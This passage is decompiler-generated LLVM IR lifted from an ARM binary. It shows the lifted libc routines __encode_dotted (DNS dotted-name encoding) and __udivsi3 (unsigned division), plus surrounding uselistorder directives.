  uselistorder i16* @global_var_23164.175, { 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 0, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @__aeabi_read_tp, { 66, 26, 64, 63, 62, 61, 60, 59, 43, 42, 41, 102, 101, 100, 13, 52, 25, 24, 23, 97, 96, 93, 99, 98, 65, 32, 31, 67, 22, 21, 20, 95, 94, 92, 91, 90, 89, 81, 12, 76, 34, 54, 69, 88, 5, 11, 10, 9, 8, 87, 86, 7, 36, 35, 6, 1, 0, 75, 4, 3, 2, 71, 68, 33, 56, 55, 84, 85, 53, 15, 14, 37, 74, 72, 39, 40, 30, 38, 29, 28, 16, 19, 18, 50, 51, 80, 49, 79, 17, 83, 82, 46, 45, 44, 58, 57, 73, 27, 70, 48, 47, 78, 77 }
  uselistorder i32 34, { 5, 6, 7, 10, 1, 2, 0, 4, 8, 3, 9, 11 }
  uselistorder i32 129, { 0, 18, 6, 1, 4, 5, 12, 13, 14, 10, 11, 2, 15, 3, 16, 17, 7, 8, 9 }
  uselistorder i32* @fp, { 29, 30, 31, 32, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0, 54, 55, 56, 57, 58, 59, 60, 61, 66, 4, 5, 95, 96, 67, 68, 69, 70, 71, 72, 33, 34, 35, 36, 37, 38, 39, 40, 6, 7, 1, 50, 51, 52, 53, 62, 64, 63, 65, 2, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 73, 74, 75, 89, 90, 91, 92, 93, 94, 3 }
  uselistorder label %dec_label_pc_1740c, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_173e0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_173dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_173d0, { 1, 0 }
  uselistorder label %dec_label_pc_17330.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_17314, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_1742c = load i32, i32* @r4, align 4
  store i32 %v3_1742c, i32* %stack_var_-32, align 4
  %v6_1742c = load i32, i32* @r5, align 4
  %v9_1742c = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_17434 = load i32, i32* @r1, align 4
  store i32 %v0_17434, i32* %r8.global-to-local, align 4
  %v0_17438 = load i32, i32* @r2, align 4
  store i32 %v0_17438, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_174a023 = icmp slt i8* %arg1, null
  store i1 %v1_174a023, i1* %cpsr_n.global-to-local, align 1
  %v2_174a024 = icmp eq i8* %arg1, null
  store i1 %v2_174a024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_174a024, label %dec_label_pc_174b8, label %dec_label_pc_174ac

dec_label_pc_17444:                               ; preds = %dec_label_pc_174ac
  %v2_17444 = call i32 @__GI_strchr(i32 %v0_1744426, i32 46)
  store i32 %v2_17444, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17448 = icmp slt i32 %v2_17444, 0
  store i1 %v1_17448, i1* %cpsr_n.global-to-local, align 1
  %v2_17448 = icmp eq i32 %v2_17444, 0
  store i1 %v2_17448, i1* %cpsr_z.global-to-local, align 1
  %v0_1744c = load i32, i32* @r4, align 4
  %v2_1744c = sub i32 %v2_17444, %v0_1744c
  store i32 %v2_1744c, i32* @r5, align 4
  br i1 %v2_17448, label %dec_label_pc_17454, label %dec_label_pc_17460

dec_label_pc_17454:                               ; preds = %dec_label_pc_17444
  %v1_17454 = inttoptr i32 %v0_1744c to i8*
  %v3_17458 = call i32 @strlen(i8* %v1_17454)
  %sext = mul i32 %v3_17458, 16777216
  %v1_1745c = sdiv i32 %sext, 16777216
  store i32 %v1_1745c, i32* @r5, align 4
  %v0_1746c.pre = load i32, i32* @r4, align 4
  %v0_1747c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17460

dec_label_pc_17460:                               ; preds = %dec_label_pc_17444, %dec_label_pc_17454
  %v0_1747c = phi i32 [ %v2_17444, %dec_label_pc_17444 ], [ %v0_1747c.pre, %dec_label_pc_17454 ]
  %v0_1746c = phi i32 [ %v0_1744c, %dec_label_pc_17444 ], [ %v0_1746c.pre, %dec_label_pc_17454 ]
  %v0_1748c = phi i32 [ %v2_1744c, %dec_label_pc_17444 ], [ %v1_1745c, %dec_label_pc_17454 ]
  %v0_17460 = load i32, i32* %sl.global-to-local, align 4
  %v1_17460 = add i32 %v0_17460, 1
  store i32 %v1_17460, i32* %r7.global-to-local, align 4
  %v1_17464 = load i32, i32* %sb.global-to-local, align 4
  %v2_17464 = sub i32 %v1_17464, %v0_17460
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17468 = icmp slt i32 %v0_1748c, 0
  store i1 %v1_17468, i1* %cpsr_n.global-to-local, align 1
  %v2_17468 = icmp eq i32 %v0_1748c, 0
  store i1 %v2_17468, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1746c, i32* @r1, align 4
  %v0_17470 = load i32, i32* %r8.global-to-local, align 4
  %v2_17470 = add i32 %v0_17470, %v1_17460
  store i32 %v2_17470, i32* @r0, align 4
  store i32 %v0_1748c, i32* @r2, align 4
  %v1_17478 = add i32 %v2_17464, -1
  store i32 %v1_17478, i32* @r3, align 4
  %v1_1747c = add i32 %v0_1747c, 1
  store i32 %v1_1747c, i32* @r4, align 4
  br i1 %v2_17468, label %dec_label_pc_174cc, label %dec_label_pc_17484

dec_label_pc_17484:                               ; preds = %dec_label_pc_17460
  %v2_17484 = sub i32 %v0_1748c, %v1_17478
  %v3_17484 = icmp ult i32 %v0_1748c, %v1_17478
  %v4_17484 = xor i32 %v1_17478, %v0_1748c
  %v5_17484 = xor i32 %v2_17484, %v0_1748c
  %v6_17484 = and i32 %v5_17484, %v4_17484
  %v7_17484 = icmp slt i32 %v6_17484, 0
  store i1 %v7_17484, i1* %cpsr_v.global-to-local, align 1
  %v8_17484 = icmp slt i32 %v2_17484, 0
  store i1 %v8_17484, i1* %cpsr_n.global-to-local, align 1
  %v9_17484 = icmp eq i32 %v0_1748c, %v1_17478
  store i1 %v9_17484, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17484, label %dec_label_pc_1748c, label %dec_label_pc_174cc

dec_label_pc_1748c:                               ; preds = %dec_label_pc_17484
  %v1_1748c = trunc i32 %v0_1748c to i8
  %v4_1748c = add i32 %v0_17470, %v0_17460
  %v5_1748c = inttoptr i32 %v4_1748c to i8*
  store i8 %v1_1748c, i8* %v5_1748c, align 1
  %v0_17490 = call i32 @memcpy()
  store i32 %v0_17490, i32* @r0, align 4
  %v0_17494 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17494 = icmp slt i32 %v0_17494, 0
  store i1 %v1_17494, i1* %cpsr_n.global-to-local, align 1
  %v2_17494 = icmp eq i32 %v0_17494, 0
  store i1 %v2_17494, i1* %cpsr_z.global-to-local, align 1
  %v0_17498 = load i32, i32* @r5, align 4
  %v1_17498 = load i32, i32* %r7.global-to-local, align 4
  %v2_17498 = add i32 %v1_17498, %v0_17498
  store i32 %v2_17498, i32* %sl.global-to-local, align 4
  br i1 %v2_17494, label %dec_label_pc_174b8, label %dec_label_pc_1748c.dec_label_pc_174a0_crit_edge

dec_label_pc_1748c.dec_label_pc_174a0_crit_edge:  ; preds = %dec_label_pc_1748c
  %v0_174a0.pre = load i32, i32* @r4, align 4
  store i32 %v0_174a0.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_174a0 = icmp slt i32 %v0_174a0.pre, 0
  store i1 %v1_174a0, i1* %cpsr_n.global-to-local, align 1
  %v2_174a0 = icmp eq i32 %v0_174a0.pre, 0
  store i1 %v2_174a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_174a0, label %dec_label_pc_174b8, label %dec_label_pc_174ac

dec_label_pc_174ac:                               ; preds = %entry, %dec_label_pc_1748c.dec_label_pc_174a0_crit_edge
  %v0_1744426 = phi i32 [ %v0_174a0.pre, %dec_label_pc_1748c.dec_label_pc_174a0_crit_edge ], [ %tmp, %entry ]
  %v5_174c0525 = phi i32 [ %v2_17498, %dec_label_pc_1748c.dec_label_pc_174a0_crit_edge ], [ 0, %entry ]
  %v1_174ac = inttoptr i32 %v0_1744426 to i8*
  %v2_174ac = load i8, i8* %v1_174ac, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_174b0 = icmp eq i8 %v2_174ac, 0
  store i1 %v2_174b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_174b0, label %dec_label_pc_174b8, label %dec_label_pc_17444

dec_label_pc_174b8:                               ; preds = %dec_label_pc_1748c.dec_label_pc_174a0_crit_edge, %dec_label_pc_1748c, %dec_label_pc_174ac, %entry
  %v8_174c4 = phi i32 [ 0, %entry ], [ %v5_174c0525, %dec_label_pc_174ac ], [ %v2_17498, %dec_label_pc_1748c ], [ %v2_17498, %dec_label_pc_1748c.dec_label_pc_174a0_crit_edge ]
  %v0_174b8 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_174b8 = icmp slt i32 %v0_174b8, 0
  store i1 %v1_174b8, i1* %cpsr_n.global-to-local, align 1
  %v2_174b8 = icmp eq i32 %v0_174b8, 0
  store i1 %v2_174b8, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_174b8, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_174b8
  %v6_174c0 = add i32 %v8_174c4, 1
  store i32 %v6_174c0, i32* @r0, align 4
  %v7_174c4 = load i32, i32* %r8.global-to-local, align 4
  %v9_174c4 = add i32 %v7_174c4, %v8_174c4
  %v10_174c4 = inttoptr i32 %v9_174c4 to i8*
  store i8 0, i8* %v10_174c4, align 1
  %v0_174c8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_174c8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_174c8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_174b8, %bb
  %v2_174c8 = phi i1 [ %v2_174c8.pre, %bb ], [ false, %dec_label_pc_174b8 ]
  %v1_174c8 = phi i1 [ %v1_174c8.pre, %bb ], [ %v1_174b8, %dec_label_pc_174b8 ]
  %v0_174c8 = phi i1 [ %v0_174c8.pre, %bb ], [ %v2_174b8, %dec_label_pc_174b8 ]
  %v3_174c8 = xor i1 %v2_174c8, %v1_174c8
  %v4_174c8 = or i1 %v0_174c8, %v3_174c8
  br i1 %v4_174c8, label %dec_label_pc_174cc, label %.dec_label_pc_174d0_crit_edge

.dec_label_pc_174d0_crit_edge:                    ; preds = %bb22
  %v1_174d4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_174d0

dec_label_pc_174cc:                               ; preds = %dec_label_pc_17484, %dec_label_pc_17460, %bb22
  br label %dec_label_pc_174d0

dec_label_pc_174d0:                               ; preds = %.dec_label_pc_174d0_crit_edge, %dec_label_pc_174cc
  %v1_174d4 = phi i32 [ %v1_174d4.pre, %.dec_label_pc_174d0_crit_edge ], [ -1, %dec_label_pc_174cc ]
  %v2_174d0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_174d0, i32* @r4, align 4
  store i32 %v6_1742c, i32* @r5, align 4
  store i32 %v9_1742c, i32* @r6, align 4
  ret i32 %v1_174d4

; uselistorder directives
  uselistorder i32 %v0_174b8, { 0, 2, 1 }
  uselistorder i32 %v0_174a0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17494, { 1, 0 }
  uselistorder i32 %v2_17484, { 1, 0 }
  uselistorder i32 %v1_17478, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_1748c, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1745c, { 1, 0 }
  uselistorder i1 %v2_174a024, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i32 (i8*)* @strlen, { 10, 8, 7, 6, 5, 4, 32, 31, 9, 3, 2, 0, 33, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 11, 12, 1 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 9, 5, 4, 3, 2, 1, 0, 8, 7, 6 }
  uselistorder label %dec_label_pc_174d0, { 1, 0 }
  uselistorder label %dec_label_pc_174cc, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_174b8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_174ac, { 1, 0 }
  uselistorder label %dec_label_pc_17460, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_174d8 = load i32, i32* @r1, align 4
  %v1_174d8 = add i32 %v0_174d8, -1
  store i32 %v1_174d8, i32* %r2.global-to-local, align 4
  %v2_174d8 = icmp eq i32 %v0_174d8, 0
  %v7_174d8 = icmp eq i32 %v0_174d8, 1
  %v0_174dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_174d8, i32 %v0_174dc)
  br i1 %v2_174d8, label %dec_label_pc_175c0, label %dec_label_pc_174e4

dec_label_pc_174e4:                               ; preds = %entry
  %v0_174e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_174e4 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_174e4, %v1_174e4
  br i1 %tmp, label %dec_label_pc_174ec, label %dec_label_pc_17578

dec_label_pc_174ec:                               ; preds = %dec_label_pc_174e4
  %v1_174ec = load i32, i32* %r2.global-to-local, align 4
  %v2_174ec = and i32 %v1_174ec, %v1_174e4
  %v4_174ec = icmp eq i32 %v2_174ec, 0
  br i1 %v4_174ec, label %dec_label_pc_17584, label %dec_label_pc_174f4

dec_label_pc_174f4:                               ; preds = %dec_label_pc_174ec
  %v3_174f4 = icmp ult i32 %v1_174e4, 536870912
  br i1 %v3_174f4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_174f4
  %v4_174f8 = mul i32 %v1_174e4, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_174f4, %.thread
  %v0_17518.pr36.ph = phi i32 [ %v4_174f8, %.thread ], [ %v1_174e4, %dec_label_pc_174f4 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_174f4 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_17518.pr36 = phi i32 [ %v4_1750c, %bb81 ], [ %v0_17518.pr36.ph, %.preheader.preheader ]
  %v1_17510 = phi i32 [ %v4_17510, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_17504 = icmp ugt i32 %v0_17518.pr36, 268435455
  br i1 %v2_17504, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_17518thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_17508 = icmp ult i32 %v0_17518.pr36, %v0_174e4
  br i1 %v4_17508, label %bb80, label %dec_label_pc_17518thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_1750c = and i32 %v0_17518.pr36, 268435456
  %v3_1750c = icmp eq i32 %v2_1750c, 0
  %v4_1750c = mul i32 %v0_17518.pr36, 16
  br i1 %v3_1750c, label %bb81, label %dec_label_pc_17518.loopexit

bb81:                                             ; preds = %bb80
  %v2_17510 = and i32 %v1_17510, 268435456
  %v3_17510 = icmp eq i32 %v2_17510, 0
  %v4_17510 = mul i32 %v1_17510, 16
  br i1 %v3_17510, label %.preheader, label %dec_label_pc_17518thread-pre-split.loopexit.loopexit

dec_label_pc_17518thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1752448.ph = phi i32 [ %v1_17510, %bb ], [ %v4_17510, %bb81 ]
  %v0_17518.pr38.ph = phi i32 [ %v0_17518.pr36, %bb ], [ %v4_1750c, %bb81 ]
  br label %dec_label_pc_17518thread-pre-split.loopexit

dec_label_pc_17518thread-pre-split.loopexit:      ; preds = %dec_label_pc_17518thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1752448 = phi i32 [ %v1_17510, %.thread2 ], [ %v1_1752448.ph, %dec_label_pc_17518thread-pre-split.loopexit.loopexit ]
  %v0_17518.pr38 = phi i32 [ %v0_17518.pr36, %.thread2 ], [ %v0_17518.pr38.ph, %dec_label_pc_17518thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_17518thread-pre-split

dec_label_pc_17518thread-pre-split:               ; preds = %dec_label_pc_17518thread-pre-split.loopexit, %bb83
  %v1_1752446 = phi i32 [ %v1_1752448, %dec_label_pc_17518thread-pre-split.loopexit ], [ %v3_17524, %bb83 ]
  %v0_17518.pr = phi i32 [ %v0_17518.pr38, %dec_label_pc_17518thread-pre-split.loopexit ], [ %v3_17520, %bb83 ]
  br label %dec_label_pc_17518

dec_label_pc_17518.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_17518

dec_label_pc_17518:                               ; preds = %dec_label_pc_17518.loopexit, %dec_label_pc_17518thread-pre-split
  %v1_17524 = phi i32 [ %v1_1752446, %dec_label_pc_17518thread-pre-split ], [ %v1_17510, %dec_label_pc_17518.loopexit ]
  %v1_17520 = phi i32 [ %v0_17518.pr, %dec_label_pc_17518thread-pre-split ], [ %v4_1750c, %dec_label_pc_17518.loopexit ]
  %v2_17518 = icmp slt i32 %v1_17520, 0
  br i1 %v2_17518, label %dec_label_pc_1752c, label %bb82

bb82:                                             ; preds = %dec_label_pc_17518
  %v4_1751c = icmp ult i32 %v1_17520, %v0_174e4
  br i1 %v4_1751c, label %bb83, label %dec_label_pc_1752c

bb83:                                             ; preds = %bb82
  %v3_17520 = mul i32 %v1_17520, 2
  %v2_17524 = icmp slt i32 %v1_17524, 0
  %v3_17524 = mul i32 %v1_17524, 2
  br i1 %v2_17524, label %dec_label_pc_1752c, label %dec_label_pc_17518thread-pre-split

dec_label_pc_1752c:                               ; preds = %bb82, %dec_label_pc_17518, %bb83
  %v2_1753859 = phi i32 [ %v3_17524, %bb83 ], [ %v1_17524, %bb82 ], [ %v1_17524, %dec_label_pc_17518 ]
  %v1_1753051 = phi i32 [ %v3_17520, %bb83 ], [ %v1_17520, %bb82 ], [ %v1_17520, %dec_label_pc_17518 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17530

dec_label_pc_17530:                               ; preds = %.thread11, %dec_label_pc_1752c
  %v1_17564 = phi i32 [ %v4_17564, %.thread11 ], [ %v2_1753859, %dec_label_pc_1752c ]
  %v1_17538 = phi i32 [ %v0_17570, %.thread11 ], [ 0, %dec_label_pc_1752c ]
  %v1_17568 = phi i32 [ %v4_17568, %.thread11 ], [ %v1_1753051, %dec_label_pc_1752c ]
  %v1_17534 = phi i32 [ %v0_17560, %.thread11 ], [ %v0_174e4, %dec_label_pc_1752c ]
  %v3_17530 = icmp ult i32 %v1_17534, %v1_17568
  br i1 %v3_17530, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_17530
  %v3_17534 = sub i32 %v1_17534, %v1_17568
  store i32 %v3_17534, i32* %r0.global-to-local, align 4
  %v3_17538 = or i32 %v1_17538, %v1_17564
  store i32 %v3_17538, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_17530, %bb84
  %v1_17540 = phi i32 [ %v1_17534, %dec_label_pc_17530 ], [ %v3_17534, %bb84 ]
  %v1_17544 = phi i32 [ %v1_17538, %dec_label_pc_17530 ], [ %v3_17538, %bb84 ]
  %v4_1753c = udiv i32 %v1_17568, 2
  %v6_1753c = icmp ult i32 %v1_17540, %v4_1753c
  br i1 %v6_1753c, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_17540 = urem i32 %v1_17568, 2
  %v4_17540 = icmp eq i32 %v3_17540, 0
  %v6_17540 = sub i32 %v1_17540, %v4_1753c
  store i32 %v6_17540, i32* %r0.global-to-local, align 4
  br i1 %v4_17540, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_17544 = udiv i32 %v1_17564, 2
  %v6_17544 = or i32 %v1_17544, %v5_17544
  store i32 %v6_17544, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_1754c = phi i32 [ %v6_17540, %bb85 ], [ %v1_17540, %.thread7 ], [ %v6_17540, %bb86 ]
  %v1_17550 = phi i32 [ %v1_17544, %bb85 ], [ %v1_17544, %.thread7 ], [ %v6_17544, %bb86 ]
  %v4_17548 = udiv i32 %v1_17568, 4
  %v6_17548 = icmp ult i32 %v1_1754c, %v4_17548
  br i1 %v6_17548, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_1754c = and i32 %v1_17568, 2
  %v4_1754c = icmp eq i32 %v3_1754c, 0
  %v6_1754c = sub i32 %v1_1754c, %v4_17548
  store i32 %v6_1754c, i32* %r0.global-to-local, align 4
  br i1 %v4_1754c, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_17550 = udiv i32 %v1_17564, 4
  %v6_17550 = or i32 %v1_17550, %v5_17550
  store i32 %v6_17550, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_17558 = phi i32 [ %v6_1754c, %bb87 ], [ %v1_1754c, %.thread8 ], [ %v6_1754c, %bb88 ]
  %v1_1755c = phi i32 [ %v1_17550, %bb87 ], [ %v1_17550, %.thread8 ], [ %v6_17550, %bb88 ]
  %v4_17554 = udiv i32 %v1_17568, 8
  %v6_17554 = icmp ult i32 %v1_17558, %v4_17554
  br i1 %v6_17554, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_17558 = and i32 %v1_17568, 4
  %v4_17558 = icmp eq i32 %v3_17558, 0
  %v6_17558 = sub i32 %v1_17558, %v4_17554
  store i32 %v6_17558, i32* %r0.global-to-local, align 4
  br i1 %v4_17558, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_1755c = udiv i32 %v1_17564, 8
  %v6_1755c = or i32 %v1_1755c, %v5_1755c
  store i32 %v6_1755c, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_17570 = phi i32 [ %v1_1755c, %bb89 ], [ %v1_1755c, %.thread9 ], [ %v6_1755c, %bb90 ]
  %v0_17560 = phi i32 [ %v6_17558, %bb89 ], [ %v1_17558, %.thread9 ], [ %v6_17558, %bb90 ]
  %v2_17560 = icmp eq i32 %v0_17560, 0
  br i1 %v2_17560, label %dec_label_pc_17570, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_17564, 16
  br i1 %tmp138, label %dec_label_pc_17570, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_17564 = udiv i32 %v1_17564, 16
  %v4_17568 = udiv i32 %v1_17568, 16
  br label %dec_label_pc_17530

dec_label_pc_17570:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_17570, i32* %r0.global-to-local, align 4
  ret i32 %v0_17570

dec_label_pc_17578:                               ; preds = %dec_label_pc_174e4
  %v9_174e4 = icmp eq i32 %v0_174e4, %v1_174e4
  %. = zext i1 %v9_174e4 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_17584:                               ; preds = %dec_label_pc_174ec
  %v2_17584 = icmp ugt i32 %v1_174e4, 65535
  br i1 %v2_17584, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_17584
  %v2_17588 = and i32 %v1_174e4, 32768
  %v3_17588 = icmp eq i32 %v2_17588, 0
  %v4_17588 = udiv i32 %v1_174e4, 65536
  br i1 %v3_17588, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_17584
  %v0_1759465 = phi i32 [ %v1_174e4, %dec_label_pc_17584 ], [ %v4_17588, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_17598 = phi i32 [ %v0_1759465, %.thread16 ], [ %v4_17588, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_17594 = icmp ugt i32 %v1_17598, 255
  br i1 %v2_17594, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_17598 = and i32 %v1_17598, 128
  %v3_17598 = icmp eq i32 %v2_17598, 0
  %v4_17598 = udiv i32 %v1_17598, 256
  br i1 %v3_17598, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_1759c = or i32 %storemerge, 8
  store i32 %v2_1759c, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_175a8 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_1759c, %bb98 ]
  %v1_175a4 = phi i32 [ %v1_17598, %bb96 ], [ %v4_17598, %bb97 ], [ %v4_17598, %bb98 ]
  %v2_175a0 = icmp ugt i32 %v1_175a4, 15
  br i1 %v2_175a0, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_175a4 = and i32 %v1_175a4, 8
  %v3_175a4 = icmp eq i32 %v2_175a4, 0
  %v4_175a4 = udiv i32 %v1_175a4, 16
  br i1 %v3_175a4, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_175a8 = add nsw i32 %v1_175a8, 4
  store i32 %v2_175a8, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_175b0 = phi i32 [ %v1_175a8, %.thread17 ], [ %v1_175a8, %bb99 ], [ %v2_175a8, %bb100 ]
  %v5_175b4 = phi i32 [ %v1_175a4, %.thread17 ], [ %v4_175a4, %bb99 ], [ %v4_175a4, %bb100 ]
  %v2_175ac = icmp ugt i32 %v5_175b4, 3
  %v7_175ac = icmp eq i32 %v5_175b4, 4
  %v2_175b0 = xor i1 %v7_175ac, true
  %v3_175b0 = and i1 %v2_175ac, %v2_175b0
  br i1 %v3_175b0, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_175b0 = add nsw i32 %v4_175b0, 3
  store i32 %v5_175b0, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_175b4 = phi i32 [ %v4_175b0, %.thread18 ], [ %v5_175b0, %bb101 ]
  %v2_175b4 = xor i1 %v2_175ac, true
  %v3_175b4 = or i1 %v7_175ac, %v2_175b4
  br i1 %v3_175b4, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_175b4 = udiv i32 %v5_175b4, 2
  %v9_175b4 = add i32 %v4_175b4, %v8_175b4
  store i32 %v9_175b4, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_175b8 = phi i32 [ %v4_175b4, %bb102 ], [ %v9_175b4, %bb103 ]
  %v6_175b8 = lshr i32 %v0_174e4, %v1_175b8
  store i32 %v6_175b8, i32* %r0.global-to-local, align 4
  ret i32 %v6_175b8

dec_label_pc_175c0:                               ; preds = %entry
  %v0_175c4 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_175b4, { 1, 0 }
  uselistorder i1 %v7_175ac, { 1, 0 }
  uselistorder i32 %v4_175a4, { 1, 0 }
  uselistorder i32 %v1_175a4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1759c, { 1, 0 }
  uselistorder i32 %v4_17598, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_17598, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17588, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_17560, { 1, 0 }
